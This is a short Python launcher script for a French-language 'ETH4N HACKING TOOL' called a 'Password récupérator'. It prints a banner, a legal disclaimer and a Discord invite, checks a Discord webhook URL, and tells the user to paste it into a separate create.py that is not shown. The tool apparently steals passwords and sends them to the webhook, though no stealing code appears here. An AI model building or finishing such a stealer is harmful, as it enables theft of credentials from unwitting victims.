import sys,time,random, colorama, os, ctypes

def print_slow(str):
    for letter in str:
        sys.stdout.write(letter);sys.stdout.flush();time.sleep(0.05)

ctypes.windll.kernel32.SetConsoleTitleW("ETH4N - Password récupérator")
os.system("color a")
os.system('cls')
print(colorama.Fore.RED)
print_slow("********** ETH4N HACKING TOOL **********")
print(colorama.Fore.GREEN);print_slow("\nL'utilisation de cet outil sur de vrais personnes non consentantes est illégal.\nJe ne suis non responsable de toute personne utilisant cet outil a une fin non éducative. ")
print_slow("\n\n ********** BY · − ···· ····− −· JOIN DISCORD : https://discord.gg/WMtWzV2hPV **********");input(colorama.Fore.LIGHTMAGENTA_EX + "\n\n\n-Appuyez pour continuer... \n\n");web = input("Mettez votre webhook ici :")
if "https://discord.com/api/webhooks/" in web:
    os.system('cls')
    print(colorama.Fore.LIGHTGREEN_EX)
    print_slow("Ouvre le fichier create.py et ecrit ton webhook dans les gimets a la ligne 1 !!")

else:
    print(colorama.Fore.RED)
    print_slow("Ton lien n'est pas valide\n")
    time.sleep(5)
    print('Le programme va redemarrer... 5');time.sleep(1);print('Le programme va redemarrer... 4');time.sleep(1);print('Le programme va redemarrer... 3');time.sleep(1);print('Le programme va redemarrer... 2');time.sleep(1);print('Le programme va redemarrer... 1')
    os.system('cls')
    os.system('python start.py')

if web == "easter egg":
    print_slow("−··· ·−· ·− ···− −−−  −··· −−·  − ··−  ·− ···  − ·−· −−− ··− ···− ··−··  ··− −·  · ·− ··· − · ·−·  · −−· −−· −−··−−  ·−−· −−− ··− ·−·  −−· ·− −−· −· · ·−·  − ·−  ·−· ··−·· −·−· −−− −− ·−−· · −· ··· ·  −·−· ·− −·−· ···· ··−··  ·−· · ·−−− −−− ·· −·  −− −−− −·  −·· ·· ··· −·−· −−− ·−· −··  · −  −·· −−  −− −−− ··  −·−·−− ")
